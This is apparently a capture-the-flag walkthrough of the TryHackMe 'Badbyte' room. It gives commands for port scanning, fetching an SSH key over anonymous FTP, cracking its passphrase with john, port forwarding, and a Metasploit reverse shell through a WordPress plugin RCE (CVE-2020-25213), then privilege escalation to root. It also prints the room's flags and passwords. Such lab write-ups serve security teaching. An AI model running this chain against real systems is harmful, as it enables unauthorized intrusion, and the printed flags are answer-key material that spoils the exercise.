# Badbyte

{% embed url="https://tryhackme.com/room/badbyte" %}
https://tryhackme.com/room/badbyte
{% endembed %}

![](../../.gitbook/assets/Badbyte.png)

## Task 2 Reconnaissance

```bash
rustscan -a 10.10.99.160 -- -n -sVC
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 08-25-14.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 08-25-53.png>)

#### How many ports are open?

{% hint style="success" %}
`2`
{% endhint %}

#### What service is running on the lowest open port?

{% hint style="success" %}
`ssh`
{% endhint %}

#### What non-standard port is open?

{% hint style="success" %}
`30024`
{% endhint %}

#### What service is running on the non-standard port?

{% hint style="success" %}
`ftp`
{% endhint %}

## Task 3 Foothold

#### What username do we find during the enumeration process?

```bash
lftp -u anonymous, -p 30024 10.10.99.160
ftp > ls -lA
ftp > cat note.txt
ftp > get id_rsa
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 08-46-49.png>)

{% hint style="success" %}
`errorcauser`
{% endhint %}

#### What is the passphrase for the RSA private key?

```bash
chmod 400 id_rsa
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ssh -i id_rsa errorcauser@10.10.99.160
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 08-48-58.png>)

{% hint style="success" %}
`cupcake`
{% endhint %}

## Task 4 Port Forwarding

#### What main TCP ports are listening on localhost?

```bash
vim /etc/proxychains4.conf
ssh -nNTD 1337 -i id_rsa errorcauser@10.10.99.160
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 08-57-57.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 08-59-02.png>)

```bash
proxychains nmap 127.0.0.1
ssh -nNTL 80:127.0.0.1:80 -i id_rsa errorcauser@10.10.99.160
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-06-56.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-16-30.png>)

{% hint style="success" %}
`80,3306`
{% endhint %}

#### What protocols are used for these ports?

{% hint style="success" %}
`http,mysql`
{% endhint %}

## Task 5 Web Exploitation

#### What CMS is running on the machine?

```bash
nmap -n -sVC -p 80 127.0.0.1
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-27-41.png>)

{% hint style="success" %}
`WordPress`
{% endhint %}

#### Can you find any vulnerable plugins?

```bash
nmap -n -p80 --script http-wordpress-enum \
     --script-args type="plugins",search-limit=1500 127.0.0.1
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-44-39.png>)

#### What is the CVE number for directory traversal vulnerability?

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-47-18.png>)

{% hint style="success" %}
`CVE-2020-11738`
{% endhint %}

#### What is the CVE number for remote code execution vulnerability?

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-48-22.png>)

{% hint style="success" %}
`CVE-2020-25213`
{% endhint %}

#### There is a metasploit module for the exploit. You can use it to get the reverse shell. If you are feeling lucky you can follow any POC( Proof of Concept).

```bash
msfconsole -q
msf > search CVE-2020-25213
msf > use 0
msf > set RHOSTS 127.0.0.1
msf > set LHOST 10.6.9.176
msf > run
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-54-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 09-57-14.png>)

#### What is the name of user that was running CMS?

```bash
meterpreter > getuid
```

{% hint style="success" %}
`cth`
{% endhint %}

#### What is the user flag?

```bash
meterpreter > search -d / -f user.txt
meterpreter > cat //home/cth/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 10-00-24.png>)

{% hint style="success" %}
`THM{227906201d17d9c45aa93d0122ea1af7}`
{% endhint %}

## Task 6 Privilege Escalation

#### What is the user's **old** password?

```
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
ls -lA /var/log
cat /var/log/bash.log
su - cth
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 10-04-57.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-03 10-05-35.png>)

{% hint style="success" %}
`G00dP@$sw0rd2020`
{% endhint %}

#### What is the root flag?

```bash
sudo -l
sudo cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-04-03 10-10-53.png>)

{% hint style="success" %}
`THM{ad485b44f63393b6a9225974909da5fa}`
{% endhint %}

## Reference

{% embed url="https://www.aldeid.com/wiki/Category:Penetration-testing/Wordpress" %}

{% embed url="https://cve.mitre.org/cve/search_cve_list.html" %}
